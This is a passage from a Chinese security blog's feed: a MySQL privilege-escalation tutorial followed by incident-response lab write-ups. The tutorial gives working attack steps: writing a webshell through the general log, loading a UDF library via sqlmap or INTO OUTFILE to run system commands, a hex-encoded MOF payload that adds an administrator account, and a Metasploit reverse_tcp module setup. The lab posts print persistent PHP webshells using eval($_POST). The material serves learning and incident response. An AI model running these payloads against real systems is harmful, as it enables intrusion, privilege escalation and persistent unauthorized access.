bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更改日志文件位置</span><br><span class="hljs-built_in">set</span> global general_log = <span class="hljs-string">&quot;ON&quot;</span>;<br><span class="hljs-built_in">set</span> global general_log_file=<span class="hljs-string">&#x27;/var/www/html/info.php&#x27;</span>;<br></code></pre></td></tr></table></figure><h1 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h1><p>自定义函数(user defined function)，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version () 等方便。</p><h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><p><strong>动态链接库</strong></p><p>自定义函数是是使用动态链接库的形式实现的，如果是 MySQL &gt;&#x3D; 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p><p>动态链接库的文件可以去sqlmap和metasploit工具里面去找</p><p><strong>sqlmap的udf文件位置</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sqlmap根目录/data/udf/mysql<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441364.png" alt="image-20240712174152824"></p><p>里面有windows和Linux的32位和64位的动态链接库</p><p>不过sqlmap里的动态链接库为了防止误杀经过编码处理不能直接使用，不过可以利用sqlmap自带的解码工具来进行解码使用，工具在&#x2F;extra&#x2F;cloak&#x2F;cloak.py</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 解码 32 位的 Linux 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><br><span class="hljs-comment"># 解码 64 位的 Linux 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><br><span class="hljs-comment"># 解码 32 位的 Windows 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><br><span class="hljs-comment"># 解码 64 位的 Windows 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure><p><strong>Metasploit的udf文件位置</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">MSF根目录/data/exploits/mysql<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151441365.png" alt="image-20240713012640874"></p><p>msf自带的动态链接库不需要解码可以直接使用</p><blockquote><p>kali里面msf的根目录在&#x2F;usr&#x2F;share&#x2F;metasploit-framework</p></blockquote><p><strong>下一步就是将链接库放到插件目录下</strong></p><p>可以用下面命令查找插件目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">show variables like <span class="hljs-string">&quot;%plugin%&quot;</span><br><span class="hljs-comment">#这样也行</span><br><span class="hljs-keyword">select</span> @@plugin_dir;<br></code></pre></td></tr></table></figure><p>如果不存在的话可以找到 MySQL 的安装目录然后手工创建 <code>\lib\plugin</code> 文件夹</p><p>找mysql的安装目录可以用这个命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> @@basedir;<br></code></pre></td></tr></table></figure><p><strong>写入动态链接库</strong></p><p>sql注入是post注入可以直接写，因为get有长度限制，这里可以用sqlmap来写</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sqlmap -u &lt;url地址&gt; --data=<span class="hljs-string">&quot;id=1&quot;</span> --file-write=<span class="hljs-string">&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot;</span> --file-dest=<span class="hljs-string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span><br></code></pre></td></tr></table></figure><p>也可以直接手工用sql语句写进去，这些前提都是有写权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 直接 SELECT 查询十六进制写入</span><br>SELECT 0x7f454c4602... INTO OUTFILE <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;<br></code></pre></td></tr></table></figure><p>十六进制的获取可以直接本地用mysql的hex函数编码一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 直接传入路径编码</span><br>SELECT hex(load_file(<span class="hljs-string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>));<br><br><span class="hljs-comment"># 也可以将路径 hex 编码</span><br>SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f));<br></code></pre></td></tr></table></figure><p><strong>然后就是创建自定义函数并调用命令</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> STRING SONAME <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br>#查看是否新增了sys_eval<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func;<br>#然后就可以执行系统命令了<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>#删除自定义函数<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval;<br></code></pre></td></tr></table></figure><blockquote><p>如果想看so文件里面有哪些函数，可以拖进ida里面看一看</p></blockquote><h1 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h1><p>这是一个比较老的漏洞了，基本上在 Windows Server 2003 的环境下才可以成功。</p><p>提权的原理是 C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; 目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p><p><strong>mof脚本的内容</strong></p><figure class="highlight vbscript"><table><tr><td class="code"><pre><code class="hljs vbscript">#pragma name<span class="hljs-built_in">space</span>(<span class="hljs-string">&quot;\\\\.\\root\\subscription&quot;</span>) <br><br>instance of __EventFilter as $EventFilter <br>&#123; <br>    EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>; <br>    Name  = <span class="hljs-string">&quot;filtP2&quot;</span>; <br>    Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span> <br>            <span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span> <br>            <span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>; <br>    QueryLanguage = <span class="hljs-string">&quot;WQL&quot;</span>; <br>&#125;; <br><br>instance of ActiveScriptEventConsumer as $Consumer <br>&#123; <br>    Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>; <br>    ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>; <br>    ScriptText = <br><span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe user hacker P@ssw0rd /add\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe localgroup administrators hacker /add\<span class="hljs-string">&quot;)&quot;</span>; <br>&#125;; <br><br>instance of __FilterToConsumerBinding <br>&#123; <br>    Consumer   = $Consumer; <br>    Filter = $EventFilter; <br>&#125;;<br></code></pre></td></tr></table></figure><p>核心payload</p><figure class="highlight vbscript"><table><tr><td class="code"><pre><code class="hljs vbscript">var WSH = <span class="hljs-keyword">new</span> ActiveXObject(\<span class="hljs-string">&quot;WScript.Shell\&quot;</span>)\nWSH.run(\<span class="hljs-string">&quot;net.exe user hacker P@ssw0rd /add\&quot;</span>)\nWSH.run(\<span class="hljs-string">&quot;net.exe localgroup administrators hacker /add\&quot;</span>)<br>#这两段指令分别是使用net.exe工具添加一个名为<span class="hljs-string">&quot;hacker&quot;</span>的新用户，密码设置为<span class="hljs-string">&quot;P@ssw0rd&quot;</span>。/add参数表示添加一个新用户<br>#将用户<span class="hljs-string">&quot;hacker&quot;</span>添加到本地管理员组（localgroup administrators）。这意味着<span class="hljs-string">&quot;hacker&quot;</span>用户将拥有管理员权限。<br></code></pre></td></tr></table></figure><p>依然可以用上面的方法把文件变成十六进制写入</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">mysql <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A</span> <span class="hljs-keyword">into</span> dumpfile &quot;C:/windows/system32/wbem/mof/test.mof&quot;;<br></code></pre></td></tr></table></figure><p>执行成功的的时候，test.mof 会出现在：c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;good&#x2F; 目录下 否则出现在 c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;bad 目录下</p><p><strong>痕迹清理</strong></p><p>因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 停止 winmgmt 服务</span><br>net stop winmgmt<br><br><span class="hljs-comment"># 删除 Repository 文件夹</span><br><span class="hljs-built_in">rmdir</span> /s /q C:\Windows\system32\wbem\Repository\<br><br><span class="hljs-comment"># 手动删除 mof 文件</span><br>del C:\Windows\system32\wbem\mof\good\test.mof /F /S<br><br><span class="hljs-comment"># 删除创建的用户</span><br>net user hacker /delete<br><br><span class="hljs-comment"># 重新启动服务</span><br>net start winmgmt<br></code></pre></td></tr></table></figure><p><strong>msf提权</strong></p><p>msf里面就有mof提权的模块，还会自动清理痕迹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf6 &gt; use exploit/windows/mysql/mysql_mof<br><span class="hljs-comment"># 设置好自己的 payload</span><br>msf6 &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><br><span class="hljs-comment"># 设置目标 MySQL 的基础信息</span><br>msf6 &gt; <span class="hljs-built_in">set</span> rhosts 10.211.55.21<br>msf6 &gt; <span class="hljs-built_in">set</span> username root<br>msf6 &gt; <span class="hljs-built_in">set</span> password root<br>msf6 &gt; run<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考文章：&lt;a href=&quot;https://www.sqlsec.com/2020/11/mysql.html&quot;&gt;https://www.sqlsec.com/2020/11/mysql.html&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;权限获取&quot;&gt;&lt;a href=&quot;#权限获取&quot; </summary>
      
    
    
    
    <category term="提权" scheme="https://clowsman.github.io/categories/%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="mysql" scheme="https://clowsman.github.io/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>玄机应急响应靶场-第二章</title>
    <link href="https://clowsman.github.io/2024/07/10/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/"/>
    <id>https://clowsman.github.io/2024/07/10/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/</id>
    <published>2024-07-10T06:31:01.000Z</published>
    <updated>2024-07-15T08:45:17.051Z</updated>
    
    <content type="html"><![CDATA[<h1 id="apache日志分析"><a href="#Apache日志分析" class="headerlink" title="Apache日志分析"></a>Apache日志分析</h1><p>靶场简介：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">账号密码 root apacherizhi<br>ssh root@IP<br>1、提交当天访问次数最多的IP，即黑客IP：<br>2、黑客使用的浏览器指纹是什么，提交指纹的md5：<br>3、查看index.php页面被访问的次数，提交次数：<br>4、查看黑客IP访问了多少次，提交次数：<br>5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:<br></code></pre></td></tr></table></figure><p>apache的日志放在&#x2F;var&#x2F;log&#x2F;apache目录下面</p><p><img src="http://cdn.clown2024.cn/202407151644888.png" alt="image-20240710153749475"></p><p>然后用下面指令筛选出访问的ip次数</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cut</span> -d- -f 1 access.log.1|<span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -rn | <span class="hljs-built_in">head</span> -20 <br><span class="hljs-comment">#----------</span><br><span class="hljs-built_in">cut</span>命令用于剪切并分割文件中的行。<br>-d-指定分隔符为<span class="hljs-string">&quot;-&quot;</span>，即以连字符作为字段的分隔符。<br>-f 1指定只提取每个字段的第一个部分，也就是行的第一个元素。<br><br><span class="hljs-built_in">sort</span>命令用于对文本行进行排序。<br>-r选项表示以逆序（从大到小）排序。<br>-n选项表示按照数值大小进行排序。<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644889.png" alt="image-20240710155027635"></p><p>flag{192.168.200.2}</p><p>浏览器指纹就过滤一下看看具体的信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep 192.168.200.2<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644890.png" alt="image-20240710155145579"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//浏览器指纹<br>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36<br><br>flag&#123;2d6330f380f44ac20f3a02eed0958f66&#125;<br></code></pre></td></tr></table></figure><p> 找index.php页面被访问的次数</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;/index.php&quot;</span> | <span class="hljs-built_in">wc</span> -l<br><span class="hljs-comment"># wc -l命令用于计算匹配到的行数，flag&#123;27&#125;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644891.png" alt="image-20240711125509920"></p><p>查找黑客ip访问的次数，我们只要把去掉重复行改成计算匹配行数即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;192.168.200.2 - -&quot;</span> | <span class="hljs-built_in">wc</span> -l<br><span class="hljs-comment">#flag&#123;6555&#125;</span><br></code></pre></td></tr></table></figure><p>查看2023年8月03日8时这一个小时内有多少IP访问，把第一个查看访问ip改成时间即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | grep <span class="hljs-string">&quot;03/Aug/2023:08:&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> -nr| <span class="hljs-built_in">uniq</span> -c<br><span class="hljs-comment"># 我们要用ip来匹配才能正确去掉重复行，所以要先awk打印第一个字段也就是ip</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644892.png" alt="image-20240711130832864"></p><p>flag{5}</p><h1 id="mysql应急响应"><a href="#mysql应急响应" class="headerlink" title="mysql应急响应"></a>mysql应急响应</h1><p>靶机简介</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mysql应急响应 ssh账号 root  密码 xjmysql<br>ssh env.xj.edisec.net  -p xxxxx<br>1.黑客第一次写入的shell flag&#123;关键字符串&#125; <br>2.黑客反弹shell的ip flag&#123;ip&#125;<br>3.黑客提权文件的完整路径 md5 flag&#123;md5&#125; 注 /xxx/xxx/xxx/xxx/xxx.xx<br>4.黑客获取的权限 flag&#123;whoami后的值&#125;<br></code></pre></td></tr></table></figure><p>先去看一下mysql的日志，在&#x2F;var&#x2F;log&#x2F;mysql下面</p><p><img src="http://cdn.clown2024.cn/202407151644893.png" alt="image-20240711182807349"></p><p><img src="http://cdn.clown2024.cn/202407151644894.png" alt="image-20240711182925627"></p><p>看看web目录下有没有被写shell，毕竟一般都是从网站开始渗透的</p><p><img src="http://cdn.clown2024.cn/202407151644895.png" alt="image-20240711183039409"></p><p>果然有，flag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}</p><p>也可以直接使用河马查杀，刚学到的，下载也很快，这是官网：<a href="https://www.shellpub.com/doc/hm_linux_usage.html">https://www.shellpub.com/doc/hm_linux_usage.html</a></p><p>用法也很简单</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 下载解压缩</span><br>wget -O /opt/hm-linux.tgz http://dl.shellpub.com/hm/latest/hm-linux-amd64.tgz?version=1.7.0<br><span class="hljs-built_in">cd</span> /opt<br>tar xvf hm-linux.tgz<br><span class="hljs-comment"># 使用</span><br>./hm deepscan &lt;要扫描的目录&gt; <span class="hljs-comment"># 深度扫描，扫描完成之后结果会保存为result.csv文件</span><br>./hm scan &lt;要扫描的目录&gt; <span class="hljs-comment">#扫描完成之后结果会保存为result.csv文件，使用记事本或者excel打开查看</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644896.png" alt="image-20240711183620135"></p><p>查找反弹shell的地址，我们可以看看error.log有没有什么异常的地方</p><p><img src="http://cdn.clown2024.cn/202407151644897.png" alt="image-20240711183935052"></p><p>感觉&#x2F;tmp&#x2F;1.sh有点奇怪，去看一下</p><p><img src="http://cdn.clown2024.cn/202407151644898.png" alt="image-20240711184013639"></p><p>可以发现是一个bash的反弹shell指令，找到反弹的地址，flag{192.168.100.13}</p><p>这个文件在&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;下也有</p><p><img src="http://cdn.clown2024.cn/202407151644899.png" alt="image-20240712001549368"></p><p>寻找黑客提权的完整路径，这里能够提权应该泄露了一些用户信息，我们发现在web目录下的common.php里面有root用户的信息</p><p><img src="http://cdn.clown2024.cn/202407151644900.png" alt="image-20240712002457267"></p><p>mysql常规的提权套路就是udf提权，如果是的话那么应该就会在 &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;留下文件痕迹，我们去看一下</p><p><img src="http://cdn.clown2024.cn/202407151644901.png" alt="image-20240711184502176"></p><p>那提权路径就是&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;udf.so，flag{b1818bde4e310f3d23f1005185b973e7}</p><p>查看提权后的权限，看一下进程详细信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ps -aux<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644902.png" alt="image-20240711184705362"></p><p>可以看到应该是那个mysql的用户，那么权限就是flag{mysql}</p><p>或者进入到mysql里面用**select sys_eval(“whoami”);**查看当前用户</p><p>参考文章：<a href="https://blog.csdn.net/JACKBREAK/article/details/139037618">https://blog.csdn.net/JACKBREAK/article/details/139037618</a></p><h1 id="redis应急响应"><a href="#redis应急响应" class="headerlink" title="redis应急响应"></a>redis应急响应</h1><p>靶机介绍</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">服务器场景操作系统 Linux<br>服务器账号密码 root xjredis<br><br>任务环境说明<br>    注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！<br>    应急响应工程师小王某人收到安全设备告警服务器被植入恶意文件，请上机排查<br></code></pre></td></tr></table></figure><p>步骤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;<br>通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交;<br>通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交;<br>通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag&#123;黑客的用户-关键字符串&#125; 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交<br>通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交;<br></code></pre></td></tr></table></figure><p>那就先去看一下redis的日志在&#x2F;var&#x2F;log下面</p><p><img src="http://cdn.clown2024.cn/202407151644903.png" alt="image-20240712004115278"></p><p>这里找到一张主从复制时的通信过程图，所以有<strong>Master replied to PING</strong>的字段即为连接成功</p><p><img src="http://cdn.clown2024.cn/202407151644904.png" alt="image-20240712011533382"></p><p><img src="http://cdn.clown2024.cn/202407151644905.png" alt="image-20240712004200679"></p><p>这里很明显应该是一个redis的主从复制，但是都是失败连接，再往下还有尝试其他ip的连接，最后成功的是20的ip</p><p><img src="http://cdn.clown2024.cn/202407151644906.png" alt="image-20240712004754137"></p><p>flag{192.168.100.20}</p><p>既然是主从复制那一般就会上传有so文件，我们用命令查看so文件在哪里</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&#x27;exp.so&#x27;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644907.png" alt="image-20240712005221837"></p><p>可以看到在根目录下，我们查看内容里面有flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xxd /exp.so<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644908.png" alt="image-20240712005512837"></p><p>flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}</p><p>看一下定时任务找反弹shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">corntab -l<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151644909.png" alt="image-20240712005613810"></p><p>flag{192.168.10.13}</p><p>溯源可以去看一下.ssh下的authorized_keys</p><p><img src="http://cdn.clown2024.cn/202407151644910.png" alt="image-20240712005919183"></p><p>找到了他的用户名</p><p>xj-test-user，然后去github上看一下该用户，可以找到他使用的工具</p><p><img src="http://cdn.clown2024.cn/202407151644911.png" alt="image-20240712010113376"></p><p>再去找他的历史commit</p><p><img src="http://cdn.clown2024.cn/202407151644912.png" alt="image-20240712010420376"></p><p>在first commit里面</p><p><img src="http://cdn.clown2024.cn/202407151644913.png" alt="image-20240712010539821"></p><p>flag{xj-test-user-wow-you-find-flag}</p><p>最后查找篡改的命令，可以直接去&#x2F;usr&#x2F;bin目录下查看，这里改的是ps命令，我就说一开始用ps命令为什么怪怪的</p><p><img src="http://cdn.clown2024.cn/202407151644914.png" alt="image-20240712011217461"></p><p>flag{c195i2923381905517d818e313792d196}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;apache日志分析&quot;&gt;&lt;a href=&quot;#Apache日志分析&quot; class=&quot;headerlink&quot; title=&quot;Apache日志分析&quot;&gt;&lt;/a&gt;Apache日志分析&lt;/h1&gt;&lt;p&gt;靶场简介：&lt;/p&gt;
&lt;figure class=&quot;highlight pla</summary>
      
    
    
    
    <category term="应急响应" scheme="https://clowsman.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://clowsman.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>玄机应急响应靶场-第一章</title>
    <link href="https://clowsman.github.io/2024/07/02/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/"/>
    <id>https://clowsman.github.io/2024/07/02/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0/</id>
    <published>2024-07-02T05:33:05.000Z</published>
    <updated>2024-07-15T08:45:57.790Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux入侵排查"><a href="#Linux入侵排查" class="headerlink" title="Linux入侵排查"></a>Linux入侵排查</h1><p>这是靶机的简介</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">账号：root 密码：linuxruqin<br>ssh root@IP<br>1.web目录存在木马，请找到木马的密码提交<br>2.服务器疑似存在不死马，请找到不死马的密码提交<br>3.不死马是通过哪个文件生成的，请提交文件名<br>4.黑客留下了木马文件，请找出黑客的服务器ip提交<br>5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交<br></code></pre></td></tr></table></figure><p>先简单了解一下不死马，参考文章：<a href="https://cloud.tencent.com/developer/article/1922141">https://cloud.tencent.com/developer/article/1922141</a></p><p><a href="https://blog.csdn.net/weixin_44411509/article/details/129267982">https://blog.csdn.net/weixin_44411509/article/details/129267982</a></p><p>不死马的原理就是其进程不会消亡，在内存中不断创建木马文件，从而达到无法删除的目的。</p><p>下面是一个不死马例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;shell.php&quot;</span>, <span class="hljs-variable">$content</span>);<br><span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">10000</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1. ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行，如果设置为true，则忽略与用户的断开；也就是访问了这个页面之后，脚本会一直在后台执行。<br>2. set_time_limit()函数：设置允许脚本运行的时间，单位为秒。如果设置为0（零），没有时间方面的限制。<br>3. unlink(__FILE__)函数：删除文件本身。<br>4. file_put_contents函数：将一个字符串写入文件。<br>5. usleep函数：延迟执行当前脚本若干微秒（一微秒等于一百万分之一秒）。<br></code></pre></td></tr></table></figure><p>还可以给不死马加一个密码：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.ZYGS.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_GET[&quot;zygs&quot;])==&quot;e10adc3949ba59abbe56e057f20f883e&quot;)&#123;@eval($_POST[&quot;ZYGS&quot;]);&#125;?&gt;&#x27;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>要清除不死马的话就需要通过重启主机或服务，或者条件竞争的方式修改文件内容</p><p><strong>开始排查</strong></p><p>先进web目录，看到一个1.php里面是一句话木马</p><p><img src="http://cdn.clown2024.cn/202407151645934.png" 